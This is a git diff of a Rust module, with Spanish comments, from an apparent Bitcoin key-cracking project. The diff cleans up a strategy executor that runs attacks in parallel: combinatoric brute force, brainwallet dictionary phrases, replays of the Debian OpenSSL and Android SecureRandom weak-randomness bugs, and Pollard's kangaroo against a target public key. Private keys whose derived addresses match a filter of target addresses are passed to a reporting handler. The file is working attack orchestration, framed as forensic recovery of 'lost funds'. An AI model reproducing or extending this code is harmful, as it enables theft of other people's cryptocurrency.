@@ -1,130 +1,15 @@
 // libs/domain/mining-strategy/src/executor.rs
 // =================================================================
-// APARATO: STRATEGY EXECUTOR (V7.1 - KANGAROO INTEGRATED)
-// RESPONSABILIDAD: ORQUESTACIÓN DE TODOS LOS VECTORES DE ATAQUE
+// APARATO: STRATEGY EXECUTOR (V8.0 - ELITE GOLD MASTER)
+// RESPONSABILIDAD: ORQUESTACIÓN PARALELA DE VECTORES DE ATAQUE
+// ESTADO: SANEADO, OPTIMIZADO Y DOCUMENTADO
 // =================================================================
 
 use num_bigint::BigUint;
 use num_traits::Zero;
 use rayon::prelude::*;
 use std::str::FromStr;
-
-use prospector_domain_models::{ForensicTarget, SearchStrategy, WorkOrder};
-use prospector_core_gen::address_legacy::pubkey_to_address;
-use prospector_core_math::private_key::SafePrivateKey;
-use prospector_core_math::public_key::SafePublicKey;
-use prospector_core_probabilistic::sharded::ShardedFilter;
-
-use crate::combinatoric::CombinatoricIterator;
-use crate::dictionary::DictionaryIterator;
-use crate::kangaroo::KangarooRunner; // ✅ NUEVO IMPORT
-use prospector_domain_forensics::{AndroidLcgIterator, DebianIterator};
-
-/// Interfaz para reportar colisiones encontradas hacia el worker.
-pub trait FindingHandler: Sync + Send {
-    fn on_finding(&self, address: String, pk: SafePrivateKey, source: String);
-}
-
-#[derive(Default)]
-pub struct ExecutorContext {
-    pub dictionary_cache: Option<Vec<String>>,
-}
-
-pub struct StrategyExecutor;
-
-impl StrategyExecutor {
-    pub fn execute<H: FindingHandler>(
-        job: &WorkOrder,
-        filter: &ShardedFilter,
-        context_data: &ExecutorContext,
-        handler: &H,
-    ) {
-        match &job.strategy {
-            // ... (Estrategias previas: Combinatoric, Dictionary, ForensicScan) ...
-
-            SearchStrategy::Combinatoric { prefix, suffix, start_index, end_index } => {
-                let start = BigUint::from_str(start_index).unwrap_or_else(|_| BigUint::zero());
-                let end = BigUint::from_str(end_index).unwrap_or_else(|_| BigUint::zero());
-                let iter = CombinatoricIterator::new(start, end, prefix.clone(), suffix.clone());
-                iter.par_bridge().for_each(|(phrase, pk)| {
-                    Self::check_candidate(filter, pk, format!("comb:{}", phrase), handler);
-                });
-            }
-
-            SearchStrategy::Dictionary { dataset_url: _, limit } => {
-                if let Some(words) = &context_data.dictionary_cache {
-                    let iter = DictionaryIterator::new(words, *limit);
-                    iter.par_bridge().for_each(|(phrase, pk)| {
-                        Self::check_candidate(filter, pk, format!("dict:{}", phrase), handler);
-                    });
-                }
-            }
-
-            SearchStrategy::ForensicScan { target, range_start, range_end } => {
-                let start = u64::from_str(range_start).unwrap_or(0);
-                let end = u64::from_str(range_end).unwrap_or(0);
-                match target {
-                    ForensicTarget::DebianOpenSSL => {
-                        let iter = DebianIterator::new(start, end);
-                        iter.par_bridge().for_each(|(source, pk)| {
-                            Self::check_candidate(filter, pk, source, handler);
-                        });
-                    }
-                    ForensicTarget::AndroidSecureRandom => {
-                        let iter = AndroidLcgIterator::new(start, end);
-                        iter.par_bridge().for_each(|(source, pk)| {
-                            Self::check_candidate(filter, pk, source, handler);
-                        });
-                    }
-                }
-            }
-
-            // ✅ NUEVA INTEGRACIÓN: KANGAROO
-            // Esta estrategia es especial: NO itera ciegamente contra el filtro Bloom.
-            // Tiene su propio objetivo específico (target_pubkey) definido en el trabajo.
-            SearchStrategy::Kangaroo { target_pubkey, start_scalar, width } => {
-                // KangarooRunner maneja su propia lógica de éxito internamente
-                KangarooRunner::run(
-                    target_pubkey,
-                    start_scalar,
-                    *width,
-                    handler
-                );
-            }
-
-            SearchStrategy::Random { .. } => {}
-        }
-    }
-
-    #[inline(always)]
-    fn check_candidate<H: FindingHandler>(
-        filter: &ShardedFilter,
-        pk: SafePrivateKey,
-        source: String,
-        handler: &H,
-    ) {
-        let pub_key = SafePublicKey::from_private(&pk);
-        let addr = pubkey_to_address(&pub_key, false);
-        if filter.contains(&addr) {
-            handler.on_finding(addr, pk, source);
-        }
-    }
-}
-// libs/domain/mining-strategy/src/executor.rs
-// =================================================================
-// APARATO: STRATEGY EXECUTOR (V7.1 - KANGAROO INTEGRATED)
-// RESPONSABILIDAD: ORQUESTACIÓN DE VECTORES DE ATAQUE CRIPTOGRÁFICO
-// CARACTERÍSTICAS:
-// - Parallelism: Rayon Work-Stealing para saturación de CPU.
-// - BigInt Support: Aritmética U256 para el espacio completo de claves.
-// - Sharding: Ruteo eficiente O(1) contra filtros particionados.
-// - Modularidad: Delegación de lógica compleja (Kangaroo) a adaptadores.
-// =================================================================
-
-use num_bigint::BigUint;
-use num_traits::Zero;
-use rayon::prelude::*;
-use std::str::FromStr;
+use tracing::{debug, warn};
 
 // --- DOMINIO & MODELOS ---
 use prospector_domain_models::{ForensicTarget, SearchStrategy, WorkOrder};
@@ -138,36 +23,44 @@ use prospector_core_probabilistic::sharded::ShardedFilter;
 // --- ESTRATEGIAS (MÓDULOS LOCALES) ---
 use crate::combinatoric::CombinatoricIterator;
 use crate::dictionary::DictionaryIterator;
-use crate::kangaroo::KangarooRunner; // ✅ ADAPTADOR CANGURO
+use crate::kangaroo::KangarooRunner;
 use prospector_domain_forensics::{AndroidLcgIterator, DebianIterator};
 
-/// Interfaz para el reporte de hallazgos (Finding).
-/// Permite desacoplar la lógica de búsqueda del mecanismo de transporte (HTTP/Console).
+/// Interfaz abstracta para el reporte de hallazgos (Finding).
+/// Permite desacoplar la lógica de cálculo del mecanismo de transporte (HTTP/Console/Socket).
 pub trait FindingHandler: Sync + Send {
-    /// Se invoca cuando una clave privada genera una dirección presente en el Filtro.
+    /// Callback invocado cuando se detecta una colisión confirmada.
+    ///
+    /// # Argumentos
+    /// * `address` - La dirección pública Bitcoin (P2PKH).
+    /// * `pk` - La clave privada recuperada (objeto seguro).
+    /// * `source` - Metadatos sobre cómo se encontró (ej: "brainwallet:satoshi").
     fn on_finding(&self, address: String, pk: SafePrivateKey, source: String);
 }
 
-/// Contexto de ejecución de solo lectura compartido entre hilos.
-/// Optimiza el uso de memoria evitando clonaciones de datasets grandes (Diccionarios).
+/// Contexto de ejecución de solo lectura compartido entre hilos de minería.
+///
+/// Optimiza el uso de memoria evitando clonaciones masivas de datasets estáticos
+/// (como diccionarios de 100MB) en cada hilo de ejecución.
 #[derive(Default)]
 pub struct ExecutorContext {
-    /// Caché de palabras en RAM para evitar I/O repetitivo en ataques de diccionario.
+    /// Caché de palabras en RAM (Heap Global) para ataques de diccionario.
     pub dictionary_cache: Option<Vec<String>>,
 }
 
-/// Motor de ejecución estática.
-/// Actúa como un Router de Estrategias.
+/// Motor de ejecución estática y balanceador de carga de estrategias.
+/// Actúa como el "Cerebro" local del Worker.
 pub struct StrategyExecutor;
 
 impl StrategyExecutor {
-    /// Ejecuta la orden de trabajo asignada utilizando todos los recursos disponibles.
+    /// Ejecuta la orden de trabajo asignada utilizando paralelismo de datos (SIMD/Rayon).
     ///
-    /// # Argumentos
-    /// * `job`: La definición del trabajo (Rango, Estrategia, Parámetros).
-    /// * `filter`: El filtro probabilístico particionado (La "Base de Datos" en RAM).
-    /// * `context_data`: Recursos compartidos (Diccionarios cacheados).
-    /// * `handler`: Callback para reportar éxitos.
+    /// # Flujo de Datos
+    /// 1. Decodifica la `strategy` del `WorkOrder`.
+    /// 2. Instancia el iterador correspondiente (Generador de Entropía).
+    /// 3. Convierte el iterador secuencial en un puente paralelo (`par_bridge`).
+    /// 4. Distribuye la carga en todos los núcleos de la CPU disponibles.
+    /// 5. Ejecuta `check_candidate` en el bucle caliente.
     pub fn execute<H: FindingHandler>(
         job: &WorkOrder,
         filter: &ShardedFilter,
@@ -176,8 +69,7 @@ impl StrategyExecutor {
     ) {
         match &job.strategy {
             // =================================================================
-            // ESTRATEGIA 1: COMBINATORIA (FUERZA BRUTA INTELIGENTE)
-            // Recorre rangos numéricos secuenciales (U256) con prefijos/sufijos.
+            // ESTRATEGIA 1: COMBINATORIA (FUERZA BRUTA INTELIGENTE - U256)
             // =================================================================
             SearchStrategy::Combinatoric {
                 prefix,
@@ -185,13 +77,19 @@ impl StrategyExecutor {
                 start_index,
                 end_index,
             } => {
-                // Parseo robusto de BigInts desde Strings para evitar desbordamiento de u64
+                // Parseo seguro de BigInts. Si falla, asume 0 (Fail-Safe).
                 let start = BigUint::from_str(start_index).unwrap_or_else(|_| BigUint::zero());
                 let end = BigUint::from_str(end_index).unwrap_or_else(|_| BigUint::zero());
 
+                debug!(
+                    "🔨 Estrategia Combinatoria: {}...{}",
+                    start_index.chars().take(10).collect::<String>(),
+                    end_index.chars().take(10).collect::<String>()
+                );
+
                 let iter = CombinatoricIterator::new(start, end, prefix.clone(), suffix.clone());
 
-                // Paralelismo Automático: Rayon convierte el iterador secuencial en paralelo.
+                // Paralelismo: Rayon roba trabajo (Work-Stealing) automáticamente.
                 iter.par_bridge().for_each(|(phrase, pk)| {
                     Self::check_candidate(filter, pk, format!("comb:{}", phrase), handler);
                 });
@@ -199,46 +97,46 @@ impl StrategyExecutor {
 
             // =================================================================
             // ESTRATEGIA 2: DICCIONARIO (BRAINWALLETS)
-            // Prueba frases humanas comunes desde un dataset en memoria.
             // =================================================================
             SearchStrategy::Dictionary {
                 dataset_url: _,
                 limit,
             } => {
                 if let Some(words) = &context_data.dictionary_cache {
+                    debug!("📚 Estrategia Diccionario: Procesando {} palabras", words.len());
                     let iter = DictionaryIterator::new(words, *limit);
 
                     iter.par_bridge().for_each(|(phrase, pk)| {
                         Self::check_candidate(filter, pk, format!("dict:{}", phrase), handler);
                     });
                 } else {
-                    // TODO: Emitir warning si el diccionario no está cargado
+                    warn!("⚠️ Estrategia Diccionario solicitada pero caché vacía. Saltando.");
                 }
             }
 
             // =================================================================
             // ESTRATEGIA 3: FORENSE (ARQUEOLOGÍA DE BUGS)
-            // Reproduce generadores de números aleatorios defectuosos históricos.
             // =================================================================
             SearchStrategy::ForensicScan {
                 target,
                 range_start,
                 range_end,
             } => {
-                // Los rangos forenses (PIDs, Time seeds) suelen caber en u64
                 let start = u64::from_str(range_start).unwrap_or(0);
                 let end = u64::from_str(range_end).unwrap_or(0);
 
+                debug!("🔍 Estrategia Forense: {:?} [{} - {}]", target, start, end);
+
                 match target {
                     ForensicTarget::DebianOpenSSL => {
-                        // CVE-2008-0166: Iteración sobre Process IDs (PIDs)
+                        // CVE-2008-0166 (OpenSSL PRNG seed constraint)
                         let iter = DebianIterator::new(start, end);
                         iter.par_bridge().for_each(|(source, pk)| {
                             Self::check_candidate(filter, pk, source, handler);
                         });
                     }
                     ForensicTarget::AndroidSecureRandom => {
-                        // CVE-2013-7372: Iteración sobre Time Seeds débiles en Java SecureRandom
+                        // CVE-2013-7372 (Java SecureRandom collision)
                         let iter = AndroidLcgIterator::new(start, end);
                         iter.par_bridge().for_each(|(source, pk)| {
                             Self::check_candidate(filter, pk, source, handler);
@@ -248,37 +146,37 @@ impl StrategyExecutor {
             }
 
             // =================================================================
-            // ESTRATEGIA 4: CANGURO (POLLARD'S LAMBDA) ✅ INTEGRADO
-            // Resolución de Logaritmo Discreto en rangos acotados O(sqrt(N)).
+            // ESTRATEGIA 4: CANGURO (POLLARD'S LAMBDA / DISCRETE LOG)
             // =================================================================
             SearchStrategy::Kangaroo {
                 target_pubkey,
                 start_scalar,
                 width,
             } => {
-                // Delegamos al Adaptador especializado.
-                // KangarooRunner maneja su propia lógica de éxito interna y llama al handler si resuelve.
-                KangarooRunner::run(
-                    target_pubkey,
-                    start_scalar,
-                    *width,
-                    handler
-                );
+                debug!("🦘 Estrategia Canguro: Target {}", target_pubkey);
+                // Delegación completa al adaptador especializado
+                KangarooRunner::run(target_pubkey, start_scalar, *width, handler);
             }
 
             // =================================================================
             // ESTRATEGIA 5: ALEATORIA (MONTE CARLO)
             // =================================================================
             SearchStrategy::Random { .. } => {
-                // Placeholder para futuro fuzzing aleatorio puro de alta entropía
+                // Placeholder para futuro fuzzing de alta entropía.
+                // Actualmente inactivo para priorizar vectores deterministas.
             }
         }
     }
 
     /// Ciclo Caliente (Hot Loop) de verificación.
     ///
-    /// Esta función se ejecuta millones de veces por segundo.
-    /// Debe ser `inline(always)` para evitar el overhead de llamada a función.
+    /// Esta función es crítica para el rendimiento. Se ejecuta millones de veces por segundo.
+    ///
+    /// # Optimizaciones
+    /// * `#[inline(always)]`: Obliga al compilador a inyectar el código en el punto de llamada,
+    ///   eliminando el overhead del stack frame.
+    /// * `Global Context`: `SafePublicKey::from_private` usa tablas estáticas pre-calculadas.
+    /// * `Sharded Check`: La consulta al filtro es O(1) con acceso directo a memoria mapeada.
     #[inline(always)]
     fn check_candidate<H: FindingHandler>(
         filter: &ShardedFilter,
@@ -286,17 +184,17 @@ impl StrategyExecutor {
         source: String,
         handler: &H,
     ) {
-        // 1. Derivación PubKey (Hot Path optimizado con Global Context)
+        // 1. Derivación de Clave Pública (ECC Multiplication)
         let pub_key = SafePublicKey::from_private(&pk);
 
-        // 2. Generación Dirección Legacy (P2PKH Uncompressed)
-        // La mayoría de los fondos perdidos antiguos usan direcciones no comprimidas.
+        // 2. Generación de Dirección (Hashing RIPEMD160(SHA256))
+        // Usamos formato no comprimido (false) por defecto para arqueología pre-2012.
+        // TODO: En v9.0, hacer configurable compressed/uncompressed desde WorkOrder.
         let addr = pubkey_to_address(&pub_key, false);
 
-        // 3. Consulta al Filtro Particionado
-        // ShardedFilter hashea la dirección y consulta solo el shard relevante en RAM.
-        // Complejidad: O(1).
+        // 3. Verificación Probabilística (Bloom Filter Check)
         if filter.contains(&addr) {
+            // ¡COLISIÓN! Reportamos inmediatamente al handler (Worker Client).
             handler.on_finding(addr, pk, source);
         }
     }
